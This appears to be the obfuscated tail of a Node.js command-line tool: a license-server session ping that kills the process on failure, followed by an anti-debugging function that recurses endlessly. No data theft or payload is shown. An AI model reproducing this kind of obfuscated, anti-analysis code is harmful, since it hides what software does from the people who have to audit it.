                  v456.status === 'ok' && v456.token ? v446 = v456.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(0x1));
                } catch (v457) {
                  console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(0x1);
                }
              });
            });
          v452.on("error", () => {
            console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
            process.exit(0x1);
          }), v452.on("timeout", function () {
            this.destroy();
            console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
            process.exit(0x1);
          }), v452.write(v450), v452.end();
        }, 0xafc8);
      }
    } catch (v458) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable.")), console.error(R("    Please check your internet connection or try again later.\n")), process.exit(0x1);
    }
    !v432 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(0x1)), await new Promise(v459 => setTimeout(v459, 0x258)), await interactiveWizard(v430);
  }
  start().catch(v460 => {
    console.error(chalk.red("\n[FATAL] " + v460.message)), process.exit(0x1);
  });
}
function fn2(v461) {
  function fn10(v462) {
    fn10(++v462);
  }
  try {
    if (v461) return fn10;else fn10(0x0);
  } catch (v463) {}
}